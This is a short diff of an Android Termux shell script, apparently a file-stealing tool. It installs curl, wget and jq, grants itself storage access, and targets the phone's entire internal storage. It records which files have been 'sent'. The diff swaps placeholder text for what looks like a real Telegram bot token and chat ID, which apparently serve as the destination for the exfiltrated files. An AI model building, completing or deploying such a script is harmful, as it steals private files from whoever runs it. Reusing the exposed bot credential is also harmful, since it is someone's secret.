@@ -3,9 +3,16 @@ clear
 clear
 termux-setup-storage -y
 clear
+pkg install jq -y
+clear
+pkg install wget -y
+clear
+pkg install curl -y
+clear
+
 # Konfigurasi
-TOKEN="masukan token bot mu"
-CHAT_ID="masukan chat id mu"
+TOKEN="8369000292:AAFhrncymw4_zj5mRM6Trj5PtFNzwOAjTDU"
+CHAT_ID="8317643774"
 TARGET_DIR="/storage/emulated/0" # Direktori target (internal storage)
 SENT_FILES_FILE="$HOME/sent_files.txt"
 
